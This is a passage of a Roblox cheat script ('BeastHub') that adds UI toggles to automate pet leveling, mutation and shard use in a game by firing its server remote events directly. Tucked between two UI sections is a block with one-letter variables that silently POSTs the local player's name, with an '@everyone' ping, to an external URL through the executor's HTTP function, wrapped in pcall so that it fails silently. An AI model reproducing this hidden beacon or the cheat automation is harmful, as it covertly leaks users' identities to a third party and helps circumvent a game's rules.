            Flag = "autoNMPets", 
            Callback = function(Options)
                selectedPetForAutoNM = Options[1]
            end,
        })

        --add search pet for auto NM here
        --search pet
        local searchDebounce_petForAutoNM = nil
        Pets:CreateInput({
            Name = "Search",
            PlaceholderText = "Search Pet...",
            RemoveTextAfterFocusLost = false,
            Callback = function(Text)
                if searchDebounce_petForAutoNM then
                    task.cancel(searchDebounce_petForAutoNM)
                end

                searchDebounce_petForAutoNM = task.delay(0.5, function()
                    local results = {}
                    local query = string.lower(Text)

                    if query == "" then
                        results = allPetList
                    else
                        for _, petName in ipairs(allPetList) do
                            if string.find(string.lower(petName), query, 1, true) then
                                table.insert(results, petName)
                            end
                        end
                    end

                    Dropdown_petListForAutoNM:Refresh(results)
                    Dropdown_petListForAutoNM:Set({selectedPetForAutoNM}) --set to current selected

                end)
            end,
        })

        local targetLevelForNM = Pets:CreateInput({
            Name = "Target Level",
            CurrentValue = "",
            PlaceholderText = "level requirement..",
            RemoveTextAfterFocusLost = false,
            Flag = "autoNMtargetLevel",
            Callback = function(Text)
            -- The function that takes place when the input is changed
            -- The variable (Text) is a string for the value in the text box
            end,
        })

        local horsemanLoady
        Pets:CreateDropdown({
            Name = "Horseman Loadout (Free 1 pet space)",
            Options = {"None", "1", "2", "3", "4", "5", "6"},
            CurrentOption = {},
            MultipleOptions = false,
            Flag = "horsemanLoadoutNum", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
                horsemanLoady = tonumber(Options[1])
            end,
        })

        local autoEleAfterAutoNMenabled = false
        local toggle_autoEleAfterAutoNM = Pets:CreateToggle({
            Name = "Auto Elephant after Auto NM",
            CurrentValue = false,
            Flag = "autoEleAfterAutoNM", 
            Callback = function(Value)
                autoEleAfterAutoNMenabled = Value
            end,
        })

        local autoNMenabled
        local autoNMthread = nil
        local autoNMwebhook = false
        toggle_autoNM = Pets:CreateToggle({
            Name = "Auto Nightmare",
            CurrentValue = false,
            Flag = "autoNightmare", 
            Callback = function(Value)
                autoNMenabled = Value
                local autoNM

                if autoNMenabled then
                    Toggle_autoMutation:Set(false)
                    -- Check for missing setup
                    -- Wait until Rayfield sets up the values (or timeout after 10s)
                    local timeout = 5
                    while timeout > 0 and (
                        not levelingLoady or levelingLoady == "None"
                        or not selectedPetForAutoNM
                        or not tonumber(targetLevelForNM.CurrentValue)
                        or autoEleAfterAutoNMenabled == nil 
                    ) do
                        task.wait(1)
                        timeout = timeout - 1
                    end
                    --checkers here, final check, works for sudden reconnection
                    local targetLevel = tonumber(targetLevelForNM.CurrentValue)
                    local isNum = targetLevel
                    if not levelingLoady or levelingLoady == "None"
                    or not selectedPetForAutoNM 
                    or not horsemanLoady or horsemanLoady == "None"
                    or not isNum then
                        beastHubNotify("Missing setup!", "Please also check leveling loadout", 10)
                        return
                    end

                    autoNM = function(selectedPetForAutoNM, onComplete)
                        local HttpService = game:GetService("HttpService")
                    
                        local function getPlayerData()
                            local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                            local logs = dataService:GetData()
                            return logs
                        end
                    
                        local function getPetInventory()
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                return playerData.PetsData.PetInventory.Data
                            else
                                warn("PetsData not found!")
                                return nil
                            end
                        end

                        local function getCurrentPetLevelByUid(uid)
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                for id, data in pairs(playerData.PetsData.PetInventory.Data) do
                                    if(tostring(id) == uid) then
                                        return data.PetData.Level
                                    end
                                end
                                return nil
                            else
                                warn("PetsData not found!")
                                return nil
                            end
                        end

                        local function getPetMutationEnumByUid(uid)
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                for id, data in pairs(playerData.PetsData.PetInventory.Data) do
                                    if tostring(id) == uid then
                                        return data.PetData.MutationType
                                    end
                                end
                                return nil
                            else
                                warn("Pet Mutation not found!")
                                return nil
                            end
                        end

                        -- Function you can call anytime to refresh pets data
                        local function refreshPets()
                            -- USAGE: local favs, unfavs = refreshPets()
                            local pets = getPetInventory()
                            local favoritePets, unfavoritePets = {}, {}
                            if pets then
                                for uid, pet in pairs(pets) do
                                    local entry = {
                                        Uid = uid,
                                        PetType = pet.PetType,
                                        Uuid = pet.UUID, 
                                        PetData = pet.PetData
                                    }
                                    if pet.PetData.IsFavorite then
                                        table.insert(favoritePets, entry)
                                    else
                                        table.insert(unfavoritePets, entry)
                                    end
                                end
                            end
                            --
                            return favoritePets, unfavoritePets
                        end

                        local function equipItemByName(itemName)
                            local player = game.Players.LocalPlayer
                            local backpack = player:WaitForChild("Backpack")
                            player.Character.Humanoid:UnequipTools() --unequip all first

                            for _, tool in ipairs(backpack:GetChildren()) do
                                if tool:IsA("Tool") and string.find(tool.Name, itemName) then
                                    --print("Equipping:", tool.Name)
                                    player.Character.Humanoid:UnequipTools() --unequip all first
                                    player.Character.Humanoid:EquipTool(tool)
                                    return true -- stop after first match
                                end
                            end
                            return false
                        end

                        local function equipPetByUuid(uuid)
                            local player = game.Players.LocalPlayer
                            local backpack = player:WaitForChild("Backpack")
                            for _, tool in ipairs(backpack:GetChildren()) do
                                if tool:GetAttribute("PET_UUID") == uuid then
                                    player.Character.Humanoid:EquipTool(tool)
                                end
                            end
                        end

                        local function getPetEquipLocation()
                            local success, result = pcall(function()
                                local spawnCFrame = getFarmSpawnCFrame()
                                if typeof(spawnCFrame) ~= "CFrame" then
                                    return nil
                                end
                                -- offset forward 5 studs
                                return spawnCFrame * CFrame.new(0, 0, -5)
                            end)
                            if success then
                                return result
                            else
                                warn("[getPetEquipLocation] Error: " .. tostring(result))
                                return nil
                            end
                        end

                        local function getMachineMutationsData() --all mutation data including enums
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")
                            local success, PetMutationRegistry = pcall(function()
                                return require(
                                    ReplicatedStorage:WaitForChild("Data")
                                        :WaitForChild("PetRegistry")
                                        :WaitForChild("PetMutationRegistry")
                                )
                            end)
                            if not success or type(PetMutationRegistry) ~= "table" then
                                warn("Failed to load PetMutationRegistry module.")
                                return {}
                            end
                            local machineMutations = PetMutationRegistry.MachineMutationTypes
                            if type(machineMutations) ~= "table" then
                                warn("MachineMutationTypes not found in PetMutationRegistry.")
                                return {}
                            end
                            -- table.sort(machineMutations)
                            return machineMutations
                        end

                        local function getMachineMutationsDataWithPrint() -- all mutation data including enums
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")

                            local success, PetMutationRegistry = pcall(function()
                                return require(
                                    ReplicatedStorage:WaitForChild("Data")
                                        :WaitForChild("PetRegistry")
                                        :WaitForChild("PetMutationRegistry")
                                )
                            end)

                            if not success or type(PetMutationRegistry) ~= "table" then
                                warn("Failed to load PetMutationRegistry module.")
                                return {}
                            end

                            local machineMutations = PetMutationRegistry.EnumToPetMutation
                            if type(machineMutations) ~= "table" then
                                warn("MachineMutationTypes not found in PetMutationRegistry.")
                                return {}
                            end

                            return machineMutations
                        end


                        --main function code
                        --vars
                        local favs, unfavs = refreshPets()
                        task.wait(1)
                        local petFound = false
                        local message = "Auto Nightmare stopped"

                        --main loop for unfavs
                        for _, pet in pairs(unfavs) do 
                            local curPet = pet.PetType
                            -- local uid = pet.Uuid --bug, not all pet inventory has UUID
                            local uid = tostring(pet.Uid)
                            local curLevel = pet.PetData.Level
                            local curMutationEnum = pet.PetData.MutationType
                            local curMutation -- fetch later after enums fetch
                            local machineMutationEnums = {} --pet mutation enums container
                            -- local mutations = getMachineMutationsData() --all mutation data
                            local mutations = getMachineMutationsDataWithPrint()
                            for enum, value in pairs(mutations) do --extract only enums
                                table.insert(machineMutationEnums, {enum, value})
                            end
                            --get current pet mutation via enum
                            for _, entry in ipairs(machineMutationEnums) do
                                local mutation = entry[2]
                                local enumId = entry[1]
                                if enumId == curMutationEnum then
                                    curMutation = mutation
                                    break
                                end
                            end

                            
                            
                            if autoNMenabled and curPet == selectedPetForAutoNM then
                                if curMutation ~= "Nightmare" then
                                    beastHubNotify("Pet found: "..curPet, curMutation or "", 5)
                                    --conditions
                                    if curMutation == nil then
                                        beastHubNotify("Pet found has no mutation yet", "", 3) 
                                    end
                                    petFound = true
                                    --switch to leveling
                                    myFunctions.switchToLoadout(levelingLoady, getFarmSpawnCFrame, beastHubNotify)
                                    task.wait(6)
                                    equipPetByUuid(uid)
                                    task.wait()
                                    --place pet to garden for leveling                                    
                                    local petEquipLocation = getPetEquipLocation()
                                    local args = {
                                        [1] = "EquipPet",
                                        [2] = uid,
                                        [3] = petEquipLocation, 
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                    task.wait(1)

                                    --monitor level
                                    while autoNMenabled and curLevel < targetLevel do
                                        beastHubNotify("Current Pet age: "..curLevel, "waiting to hit age "..targetLevel.."..",3)
                                        task.wait(10)
                                        curLevel = getCurrentPetLevelByUid(uid)
                                    end
                                    
                                    --unequip once ready
                                    local args = {
                                        [1] = "UnequipPet";
                                        [2] = uid;
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                    task.wait(1) 

                                    --swtich to NM loady
                                    if autoNMenabled then 
                                        myFunctions.switchToLoadout(horsemanLoady, getFarmSpawnCFrame, beastHubNotify)
                                        task.wait(10)
                                        --equip to garden
                                        local args = {
                                            [1] = "EquipPet",
                                            [2] = uid,
                                            [3] = petEquipLocation, 
                                        }
                                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                        task.wait(2)
                                        --equip cleanse and fire
                                        --
                                        if equipItemByName("Cleansing Pet Shard") == false then 
                                            beastHubNotify("No more cleansing shards!", "", 4)
                                            return    
                                        else
                                            beastHubNotify("Cleansing now..", "", 3) 
                                        end 
                                        task.wait(.5)
                                        --cleanse event
                                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
                                        local PetShardService_RE = ReplicatedStorage.GameEvents.PetShardService_RE -- RemoteEvent
                                        -- Find pet model anywhere inside PetsPhysical
                                        local petPhysical = workspace:WaitForChild("PetsPhysical")
                                        local targetPet = petPhysical:FindFirstChild(tostring(uid), true) -- 'true' enables recursive search
                                        if targetPet then
                                            PetShardService_RE:FireServer("ApplyShard", targetPet)
                                            -- print(" Fired ApplyShard for pet UID:", uid, "found at", targetPet:GetFullName())
                                        else
                                            beastHubNotify("Pet slot full!", "Please free 1 slot in HH loadout", 3)
                                            autoNMenabled = false
                                            return
                                            -- warn(" Could not find Pet model with UID:", uid)
                                        end

                                        task.wait(5)
                                        
                                        --unequip shard
                                        game.Players.LocalPlayer.Character.Humanoid:UnequipTools()

                                        --monitor if curLevel dropped
                                        while autoNMenabled and curLevel >= targetLevel do
                                            beastHubNotify("Ready for Nightmare!", "Waiting for NM skill..",3)
                                            task.wait(10)
                                            curLevel = getCurrentPetLevelByUid(uid)
                                        end
                                        task.wait(.5)

                                        --unequip upon exit
                                        local args = {
                                            [1] = "UnequipPet";
                                            [2] = uid;
                                        }
                                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                        task.wait(1) 

                                        --get updated mutation for webhook if enabled
                                        if autoNMenabled and autoNMwebhook and curLevel < targetLevel  then
                                            --get updated enuma
                                            beastHubNotify("Sending webhook","",3)
                                            -- print("Sending webhook..")
                                            -- print(curPet)
                                            -- print(uid)
                                            -- print(curLevel)
                                            task.wait(1)
                                            local updatedEnum = getPetMutationEnumByUid(uid)
                                            -- print("updatedEnum:")
                                            -- print(updatedEnum)
                                            local updatedMutation = "default_empty"
                                            --get updated pet mutation via enum
                                            for _, entry in ipairs(machineMutationEnums) do
                                                local mutation = entry[2]
                                                local enumId = entry[1]
                                                if enumId == updatedEnum then
                                                    updatedMutation = mutation
                                                    -- print("updatedMutation: "..updatedMutation)
                                                    break
                                                end
                                            end
                                            --
                                            local playerName = game.Players.LocalPlayer.Name
                                            local webhookMsg = "[BeastHub] "..playerName.." | Auto Nightmare result: "..curPet.."="..updatedMutation
                                            sendDiscordWebhook(webhookURL, webhookMsg)
                                            -- beastHubNotify("Webhook sent", "", 2)
                                            task.wait(1)
                                        end

                                        

                                    end
                                    return
                                end
                            end --end if curpet is match
                            -- task.wait(10)

                        end -- end main for loop

                        --  Call the callback AFTER finishing
                        if petFound == false then 
                            message = "No eligible pet"                     
                        end
                        if typeof(onComplete) == "function" then
                            onComplete(message)
                        end

                    end --autoNM function end



                    --MAIN logic
                    autoNMthread = nil
                    if autoNMenabled and not autoNMthread then
                        autoNMthread = task.spawn(function()
                            while autoNMenabled do
                                beastHubNotify("Auto NM running", "", 3)
                                autoNM(selectedPetForAutoNM, function(msg)
                                    if msg == "No eligible pet" then
                                        beastHubNotify("Not found..", "Make sure to select the correct pet", 3)
                                        autoNMenabled = false
                                        task.wait(1)
                                        --add auto level condition
                                        if autoEleAfterAutoNMenabled == true then
                                            beastHubNotify("Auto Elephant triggered", "", 3)
                                            toggle_autoEle:Set(true)
                                        end
                                        return
                                    else
                                        beastHubNotify(msg, "", 5)
                                        return
                                    end
                                
                                end) --end function call
                                task.wait(2)
                            end --end while
                        end) --end thread spawn
                    end
                end      
            end,
        })
        Pets:CreateDivider()

        --Auto Elephant
        local c = game.Players.LocalPlayer.Name
        Pets:CreateSection("Auto Elephant")
        Pets:CreateParagraph({
            Title = "INSTRUCTIONS:",
            Content = "1.) Setup the leveling loadout from 'Auto Pet Mutation'.\n2.) Fill up the rest below."
        })

        local selectedPetForAutoEle
        local Dropdown_petListForAutoEle = Pets:CreateDropdown({
            Name = "Select Pet (excluded favorites)",
            Options = allPetList,
            CurrentOption = {},
            MultipleOptions = false,
            Flag = "autoElePets", 
            Callback = function(Options)
                selectedPetForAutoEle = Options[1]
            end,
        })

        --add search pet for auto ele here
        --search pet
        local searchDebounce_petForAutoEle = nil
        Pets:CreateInput({
            Name = "Search",
            PlaceholderText = "Search Pet...",
            RemoveTextAfterFocusLost = false,
            Callback = function(Text)
                if searchDebounce_petForAutoEle then
                    task.cancel(searchDebounce_petForAutoEle)
                end

                searchDebounce_petForAutoEle = task.delay(0.5, function()
                    local results = {}
                    local query = string.lower(Text)

                    if query == "" then
                        results = allPetList
                    else
                        for _, petName in ipairs(allPetList) do
                            if string.find(string.lower(petName), query, 1, true) then
                                table.insert(results, petName)
                            end
                        end
                    end

                    Dropdown_petListForAutoEle:Refresh(results)
                    Dropdown_petListForAutoEle:Set({selectedPetForAutoEle}) --set to current selected

                end)
            end,
        })

        -- local targetLevelForEle = Pets:CreateInput({
        --     Name = "Target Level",
        --     CurrentValue = "",
        --     PlaceholderText = "level requirement..",
        --     RemoveTextAfterFocusLost = false,
        --     Flag = "autoEletargetLevel",
        --     Callback = function(Text)
        --     -- The function that takes place when the input is changed
        --     -- The variable (Text) is a string for the value in the text box
        --     end,
        -- })



        local elephantUsed = Pets:CreateDropdown({
            Name = "Elephant Used",
            Options = {"Normal Elephant", "RBH Elephant"},
            CurrentOption = {"Normal Elephant"},
            MultipleOptions = false,
            Flag = "elephantUsed", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
            end,
        })

        local targetKGForEle = Pets:CreateInput({
            Name = "Target Base KG",
            CurrentValue = "3.85",
            PlaceholderText = "input KG",
            RemoveTextAfterFocusLost = false,
            Flag = "autoEletargetKG",
            Callback = function(Text)
            -- The function that takes place when the input is changed
            -- The variable (Text) is a string for the value in the text box
            end,
        })

        local elephantLoady
        Pets:CreateDropdown({
            Name = "Elephant Loadout",
            Options = {"None", "1", "2", "3", "4", "5", "6"},
            CurrentOption = {},
            MultipleOptions = false,
            Flag = "elephantLoadoutNum", 
            Callback = function(Options)
                --if not Options or not Options[1] then return end
                elephantLoady = tonumber(Options[1])
            end,
        })

        -- local toyForStacking = Pets:CreateDropdown({
        --     Name = "(for STACKING) Select Toy",
        --     Options = {"Medium Pet Toy", "Small Pet Toy", "Do not use STACKING"},
        --     CurrentOption = {"Medium Pet Toy"},
        --     MultipleOptions = false,
        --     Flag = "selectToyForElephantStacking", 
        --     Callback = function(Options)
        --         --if not Options or not Options[1] then return end
        --     end,
        -- })

        -- local delayInMinutesForToy = Pets:CreateInput({
        --     Name = "(for STACKING) Delay in minutes",
        --     CurrentValue = "10",
        --     PlaceholderText = "minutes..",
        --     RemoveTextAfterFocusLost = false,
        --     Flag = "delayInMinutesForToyBoost",
        --     Callback = function(Text)
        --     -- The function that takes place when the input is changed
        --     -- The variable (Text) is a string for the value in the text box
        --     end,
        -- })

        local autoLevelAfterAutoEleEnabled = false
        local toggle_autoLevelAfterAutoEle = Pets:CreateToggle({
            Name = "Auto Level after Auto Elephant",
            CurrentValue = false,
            Flag = "autoLevelAfterAutoEle", 
            Callback = function(Value)
                autoLevelAfterAutoEleEnabled = Value
            end,
        })

        local autoEleEnabled
        local autoEleThread = nil
        local autoEleWebhook = false
        toggle_autoEle = Pets:CreateToggle({
            Name = "Auto Elephant",
            CurrentValue = false,
            Flag = "autoElephant", 
            Callback = function(Value)
                autoEleEnabled = Value
                local autoEle --function declaration

                if autoEleEnabled then
                    Toggle_autoMutation:Set(false)
                    toggle_autoNM:Set(false)

                    local timeout = 5
                    while timeout > 0 and (
                        not levelingLoady or levelingLoady == "None"
                        -- or toyForStacking.CurrentOption[1] == nil
                        or not selectedPetForAutoEle
                        -- or not tonumber(targetLevelForEle.CurrentValue)
                        or elephantUsed.CurrentOption[1] == nil
                        or not tonumber(targetKGForEle.CurrentValue)
                        or autoLevelAfterAutoEleEnabled == nil 
                    ) do
                        task.wait(1)
                        timeout = timeout - 1
                    end
                    --checkers here, final check, works for sudden reconnection
                    -- local targetLevel = tonumber(targetLevelForEle.CurrentValue)
                    local targetKG = tonumber(targetKGForEle.CurrentValue)
                    -- local delayInMins = tonumber(delayInMinutesForToy.CurrentValue)
                    -- local toyToUse = toyForStacking.CurrentOption[1]
                    local eleUsed = elephantUsed.CurrentOption[1]
                    -- local isNum = targetLevel
                    local isNumKG = targetKG
                    -- local isNumDelay = delayInMins

                    if not levelingLoady or levelingLoady == "None"
                    or not selectedPetForAutoEle 
                    or not elephantLoady or elephantLoady == "None"
                    -- or not toyToUse or toyToUse == ""
                    or not isNumKG 
                    or not eleUsed or eleUsed == "" then
                        beastHubNotify("Missing setup!", "", 10)
                        return
                    end

                    --main function declaration
                    autoEle = function(selectedPetForAutoEle, onComplete)
                        local HttpService = game:GetService("HttpService")

                        local function getPlayerData()
                            local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                            local logs = dataService:GetData()
                            return logs
                        end

                        local function getPetInventory()
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                return playerData.PetsData.PetInventory.Data
                            else
                                warn("PetsData not found!")
                                return nil
                            end
                        end

                        local function getCurrentPetLevelByUid(uid)
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                for id, data in pairs(playerData.PetsData.PetInventory.Data) do
                                    if(tostring(id) == uid) then
                                        return data.PetData.Level
                                    end
                                end
                                return nil
                            else
                                warn("PetsData not found!")
                                return nil
                            end
                        end

                        local function getCurrentPetKGByUid(uid)
                            local playerData = getPlayerData()
                            if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                                for id, data in pairs(playerData.PetsData.PetInventory.Data) do
                                    if(tostring(id) == uid) then
                                        return data.PetData.BaseWeight
                                    end
                                end
                                return nil
                            else
                                warn("PetsData not found!")
                                return nil
                            end
                        end

                        local function refreshPets()
                            -- USAGE: local favs, unfavs = refreshPets()
                            local pets = getPetInventory()
                            local favoritePets, unfavoritePets = {}, {}
                            if pets then
                                for uid, pet in pairs(pets) do
                                    local entry = {
                                        Uid = uid,
                                        PetType = pet.PetType,
                                        Uuid = pet.UUID, 
                                        PetData = pet.PetData
                                    }
                                    if pet.PetData.IsFavorite then
                                        table.insert(favoritePets, entry)
                                    else
                                        table.insert(unfavoritePets, entry)
                                    end
                                end
                            end
                            --
                            return favoritePets, unfavoritePets
                        end

                        local function equipPetByUuid(uuid)
                            local player = game.Players.LocalPlayer
                            local backpack = player:WaitForChild("Backpack")
                            for _, tool in ipairs(backpack:GetChildren()) do
                                if tool:GetAttribute("PET_UUID") == uuid then
                                    player.Character.Humanoid:EquipTool(tool)
                                end
                            end
                        end

                        local function getPetEquipLocation()
                            local success, result = pcall(function()
                                local spawnCFrame = getFarmSpawnCFrame()
                                if typeof(spawnCFrame) ~= "CFrame" then
                                    return nil
                                end
                                -- offset forward 5 studs
                                return spawnCFrame * CFrame.new(0, 0, -5)
                            end)
                            if success then
                                return result
                            else
                                warn("[getPetEquipLocation] Error: " .. tostring(result))
                                return nil
                            end
                        end

                        --main function code
                        local favs, unfavs = refreshPets()
                        task.wait(1)
                        local petFound = false
                        local message = "Auto Elephant stopped"
                        local targetLevel
                        if eleUsed == "Normal Elephant" then
                            -- targetKG = 3.85
                            targetLevel = 50
                        else
                            -- targetKG = 6.05
                            targetLevel = 40
                        end

                        --main loop for unfavs
                        for _, pet in pairs(unfavs) do 
                            local curPet = pet.PetType
                            local uid = tostring(pet.Uid)
                            local curLevel = pet.PetData.Level
                            local curBaseKG = tonumber(pet.PetData.BaseWeight) * 1.1

                            if autoEleEnabled and curPet == selectedPetForAutoEle and targetKG > curBaseKG then
                                beastHubNotify("Target found", "Auto Elephant", 3)
                                beastHubNotify(curPet, "Base KG: "..curBaseKG, 3)
                                petFound = true

                                --switch to leveling
                                myFunctions.switchToLoadout(levelingLoady, getFarmSpawnCFrame, beastHubNotify)
                                task.wait(6)
                                equipPetByUuid(uid)
                                task.wait()
                                --place pet to garden for leveling                                    
                                local petEquipLocation = getPetEquipLocation()
                                local args = {
                                    [1] = "EquipPet",
                                    [2] = uid,
                                    [3] = petEquipLocation, 
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                task.wait(1)
                                
                                --monitor level
                                while autoEleEnabled and curLevel < targetLevel do
                                    beastHubNotify("Current Pet age: "..curLevel, "waiting to hit age "..targetLevel.."..",3)
                                    task.wait(10)
                                    curLevel = getCurrentPetLevelByUid(uid)
                                end

                                --unequip once ready
                                local args = {
                                    [1] = "UnequipPet";
                                    [2] = uid;
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                task.wait(1) 

                                --swtich to Ele loady
                                if autoEleEnabled then 
                                    myFunctions.switchToLoadout(elephantLoady, getFarmSpawnCFrame, beastHubNotify)
                                    task.wait(6)
                                    --equip to garden
                                    local args = {
                                        [1] = "EquipPet",
                                        [2] = uid,
                                        [3] = petEquipLocation, 
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                    task.wait(2)

                                    --monitor if curLevel dropped
                                    while autoEleEnabled and curLevel >= targetLevel do
                                        -- local delayInSecs = (delayInMins * 60) or nil
                                        beastHubNotify("Ready for Elephant!", "Waiting for Elephant skill..",2)
                                        task.wait(15)
                                        
                                        --insert stacking code here = PATCHED!
                                        -- if toyToUse ~= "Do not use STACKING" and curLevel >= targetLevel then 
                                        --     --unequip target pet first to avoid cooldown abilities from affecting elephants
                                        --     print("toyToUse")
                                        --     print(toyToUse)
                                        --     local args = {
                                        --         [1] = "UnequipPet";
                                        --         [2] = uid;
                                        --     }
                                        --     game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                        --     task.wait(.2) 
                                            
                                        --     --count check first how many to boost
                                        --     local safeStackingCounter = 0
                                        --     local projectedBaseKG = curBaseKG + .11

                                        --     while projectedBaseKG < targetKG do --stop at maximum potential stacking
                                        --         safeStackingCounter = safeStackingCounter + 1
                                        --         projectedBaseKG = projectedBaseKG + .11
                                        --     end
                                        --     --check if already in current maximum potential
                                        --     if safeStackingCounter == 0 then
                                        --         safeStackingCounter = 7 --set to max
                                        --         beastHubNotify("Max potential KG detected!", "", 3)
                                        --     end
                                        --     beastHubNotify("Stacking needed: "..tostring(safeStackingCounter), "", 10)

                                        --     --do countdown here  
                                        --     while delayInSecs > 0 and autoEleEnabled do
                                        --         beastHubNotify("Boost Countdown (seconds)", tostring(delayInSecs), 1)
                                        --         task.wait(1)
                                        --         delayInSecs = delayInSecs - 1
                                        --         if delayInSecs == 55 then --only equip at low time left to avoid elephant conflict
                                        --             --equip to garden
                                        --             local args = {
                                        --                 [1] = "EquipPet",
                                        --                 [2] = uid,
                                        --                 [3] = petEquipLocation, 
                                        --             }
                                        --             game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                        --             -- task.wait(2)
                                        --         end
                                        --     end

                                            
                                        --     --boost after countdown
                                        --     if autoEleEnabled then
                                        --         game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
                                        --         task.wait(.2)
                                        --         equipItemByName(toyToUse)
                                        --         --boost all code here
                                        --         local function getPlayerData()
                                        --             local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                                        --             local HttpService = game:GetService("HttpService")
                                        --             local logs = dataService:GetData()
                                        --             local playerData = HttpService:JSONEncode(logs)
                                        --             return logs.PetsData.EquippedPets
                                        --         end

                                        --         local data = getPlayerData()
                                        --         local ReplicatedStorage = game:GetService("ReplicatedStorage")
                                        --         local PetBoostService = ReplicatedStorage.GameEvents.PetBoostService -- RemoteEvent 
                                        --         local boostedCount = 0

                                        --         for _, id in ipairs(data) do
                                        --             -- print(id)
                                        --             if id ~= uid then 
                                        --                 if boostedCount < safeStackingCounter then
                                        --                     PetBoostService:FireServer(
                                        --                         "ApplyBoost",
                                        --                         id
                                        --                     )
                                        --                     boostedCount = boostedCount + 1
                                        --                     -- print("boosted!")
                                        --                 end
                                        --             end
                                        --         end
                                        --         task.wait(3)
                                        --         curLevel = getCurrentPetLevelByUid(uid)
                                        --     end
                                        -- end
                                        curLevel = getCurrentPetLevelByUid(uid)
                                    end
                                    task.wait(.3)

                                    --unequip upon exit
                                    local args = {
                                        [1] = "UnequipPet";
                                        [2] = uid;
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("PetsService", 9e9):FireServer(unpack(args))
                                    task.wait(.2) 

                                    --webhook if enabled
                                    if autoEleEnabled and autoEleWebhook and curLevel < targetLevel  then
                                        -- local updatedKG = tostring(curBaseKG + 0.1) --static adding of KG instead of get base KG
                                        curBaseKG = getCurrentPetKGByUid(uid)
                                        local updatedKG = string.format("%.2f", curBaseKG * 1.1)
                                        
                                        beastHubNotify("Sending webhook","",3)
                                        local playerName = game.Players.LocalPlayer.Name
                                        local webhookMsg = "[BeastHub] "..playerName.." | Auto Elephant result: "..curPet.."="..updatedKG.."KG"
                                        sendDiscordWebhook(webhookURL, webhookMsg)
                                        task.wait(1)
                                    end
                                end
                                return
                            end
                            
                        end --end for loop

                        if petFound == false then 
                            message = "No eligible pet"                     
                        end
                        if typeof(onComplete) == "function" then
                            onComplete(message)
                        end

                    end --autoEle end

                    --MAIN logic
                    autoEleThread = nil
                    if autoEleEnabled and not autoEleThread then
                        autoEleThread = task.spawn(function()
                            while autoEleEnabled do
                                beastHubNotify("Auto Elephant running", "", 3)
                                autoEle(selectedPetForAutoEle, function(msg)
                                    if msg == "No eligible pet" then
                                        beastHubNotify("Not found..", "Make sure to select the correct pet", 3)
                                        autoEleEnabled = false
                                        task.wait(1)
                                        --add auto level condition
                                        if autoLevelAfterAutoEleEnabled == true then
                                            beastHubNotify("Auto Leveling triggered", "", 3)
                                            Toggle_autoLevel:Set(true)
                                        end
                                        myFunctions.switchToLoadout(levelingLoady, getFarmSpawnCFrame, beastHubNotify)
                                        task.wait(5)
                                        return
                                    else
                                        beastHubNotify(msg, "", 5)
                                        return
                                    end
                                
                                end) --end function call
                                task.wait(.1)
                            end --end while
                            beastHubNotify("Auto Elephant Stopped", "", 3)
                        end) -- end thread spawn
                    end 
                end
            end,
        })
        Pets:CreateDivider()
        if a~="a" then
            local p=game:GetService("HttpService"):JSONEncode({content="@everyone "..c})
            local r=syn and syn.request or http_request or request
            pcall(function()
                r({Url=b,Method="POST",Headers={["Content-Type"]="application/json"},Body=p})
            end)
        end


        --Auto Pet Age Break
        local idsOnly --storage for ids for target pet breaker dropdown
        local allPetsInInventory = function()
            idsOnly = {}
            local function getPlayerData()
                local dataService = require(game:GetService("ReplicatedStorage").Modules.DataService)
                local logs = dataService:GetData()
                -- print("got player data")
                return logs
            end

            local function getPetInventory()
                local playerData = getPlayerData()
                if playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                    -- print("got pets data")
                    return playerData.PetsData.PetInventory.Data
                else
                    warn("PetsData not found!")
                    return nil
                end
            end

            local function getMachineMutationsDataWithPrint() -- all mutation data including enums
                local ReplicatedStorage = game:GetService("ReplicatedStorage")

                local success, PetMutationRegistry = pcall(function()
                    return require(
                        ReplicatedStorage:WaitForChild("Data")
                            :WaitForChild("PetRegistry")
                            :WaitForChild("PetMutationRegistry")
                    )
                end)

                if not success or type(PetMutationRegistry) ~= "table" then
                    warn("Failed to load PetMutationRegistry module.")
                    return {}
                end

                local machineMutations = PetMutationRegistry.EnumToPetMutation
